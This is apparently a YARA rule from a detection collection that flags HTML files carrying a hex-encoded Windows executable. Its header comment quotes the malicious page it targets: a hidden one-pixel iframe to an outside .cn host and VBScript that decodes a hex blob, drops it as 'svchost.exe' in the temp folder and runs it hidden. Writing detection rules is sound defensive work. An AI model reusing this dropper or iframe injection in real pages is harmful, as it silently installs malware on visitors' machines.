/* 
Example target...

<html><head>
<meta http-equiv="Content-Type" content="text/html; charset=iso-8859-1">

...

<iframe src="http://NtKrnlpa.cn/rc/" width=1 height=1 style="border:0"></iframe>
</body></html><SCRIPT Language=VBScript><!--
DropFileName = "svchost.exe"
WriteData = "4D5A90000300000004000000FFFF0000B800000000000000400000000000000..
Set FSO = CreateObject("Scripting.FileSystemObject")
DropPath = FSO.GetSpecialFolder(2) & "\" & DropFileName
If FSO.FileExists(DropPath)=False Then
Set FileObj = FSO.CreateTextFile(DropPath, True)
For i = 1 To Len(WriteData) Step 2
FileObj.Write Chr(CLng("&H" & Mid(WriteData,i,2)))
Next
FileObj.Close
End If
Set WSHshell = CreateObject("WScript.Shell")
WSHshell.Run DropPath, 0
//--></SCRIPT>

Source: http://pastebin.com/raw/mkDzzjEv
*/
rule misc_hexascii_pe_in_html : encoding html suspicious
{
    meta:
        id = "42QThAKYA1kG5r8MB1c01R"
        fingerprint = "v1_sha256_63bcd8a08aa4d9a33f62ce233f9f8daa974753ce69bd7f4303c3fc44efe8283a"
        version = "1.0"
        modified = "2016-03-02"
        status = "RELEASED"
        sharing = "TLP:WHITE"
        source = "YARA-RULES-COLLECTION"
        author = "Jason Batchelor"
        description = "Detect on presence of hexascii encoded executable inside scripted code section of html file"
        category = "INFO"
        created = "2016-03-02"
        university = "Carnegie Mellon University"

    strings:
        $html_start = "<html>" ascii nocase // HTML tags
        $html_end = "</html>" ascii nocase
        $mz = "4d5a"  ascii nocase // MZ header constant
        $pe = "50450000" ascii nocase // PE header constant

    condition:
        all of ($html*) and $pe in (@mz[1] .. filesize)
}










